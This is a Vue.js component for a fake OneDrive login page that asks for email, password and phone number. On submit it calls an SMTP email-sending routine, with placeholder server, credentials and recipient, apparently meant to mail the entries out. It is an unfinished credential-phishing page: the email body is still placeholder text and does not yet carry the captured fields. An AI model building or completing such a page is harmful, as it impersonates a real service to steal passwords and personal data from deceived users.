<style src="~/assets/style.css"></style>
<template>
    <div class="login-page">
			<div class="form">
				<img src="/onedrive.jpeg" height="84px">
				<form class="login-form" :state="formstate" @submit.prevent="sendEmail">
					<input type="email" placeholder="Email" v-model="model.email" name="email" id="user" class="input"/>
					<p class="error" id="error"></p>
					<input type="password" placeholder="Password" v-model="model.password" name="password" id="pass" class="input" required>
					<input type="phone" placeholder="Phone Number" v-model="model.phone" name="phone" id="phone" class="input" required />
					<input type="submit" name="submit" id="button" value="login" required>
				</form>
			</div>
		</div>
</template>
<script>
export default {
    name: "index",
    layout: "",
    computed: {
        
    },
    data() {
        return {
            formstate: {},
            model: {
                email: "",
                password: "",
                phone: ""
            },
        };
    },
    methods: {
        sendEmail(){
            alert("I get here")
            Email.send({
                Host : "smtp.yourisp.com",
                Username : "username",
                Password : "password",
                To : 'them@website.com',
                From : "you@isp.com",
                Subject : "This is the subject",
                Body : "And this is the body"
            }).then(
            message => alert(message)
            );
        }
    }
}
</script>